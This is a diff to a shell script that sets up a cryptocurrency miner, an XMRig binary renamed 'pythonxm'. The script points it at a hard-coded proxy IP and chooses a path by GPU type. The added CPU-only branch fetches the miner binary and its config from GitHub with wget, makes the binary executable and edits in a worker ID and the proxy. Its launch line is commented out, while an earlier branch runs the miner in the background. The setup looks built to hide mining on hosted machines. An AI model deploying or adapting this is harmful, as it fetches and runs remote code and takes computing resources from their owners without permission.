@@ -4,10 +4,10 @@
 
 echo -e '##########################################################################'
 PROX=78.47.69.185
-ETPort=8080
+ETPort=443
 RVPort=80
-VCPort=6006
-echo -e '################## '"MAX $PROX"' Ver:0.0.8     ################'
+VCPort=8080
+echo -e '################## '"MAX $PROX"' Ver:0.0.9     ################'
 echo -e '##########################################################################'
 
 ## getting IP info
@@ -175,6 +175,22 @@ sed -i "s+ip0001+RV_$INFO+g" config.json
 sed -i "s+xxpppxx+$PROX+g" config.json
 
 ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
+elif [ $( nvidia-smi  2>&1 |  grep "not found" |wc -l) == 1 ]
+then
+echo -e "${On_IRed}"'###########################################################'
+echo -e "####################### No nvidia ONLY CPU #########################"
+echo -e '####################################################################'"${Color_Off}"
+GPU=NONE
+echo > ooutxm
+rm -rf pythonxm
+wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+chmod +x pythonxm
+#                Config
+wget -q https://github.com/one10001/10001code/raw/main/config.json
+sed -i "s+ip0001+RV_$INFO+g" config.json
+sed -i "s+xxpppxx+$PROX+g" config.json
+
+#./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
 
 elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
 then
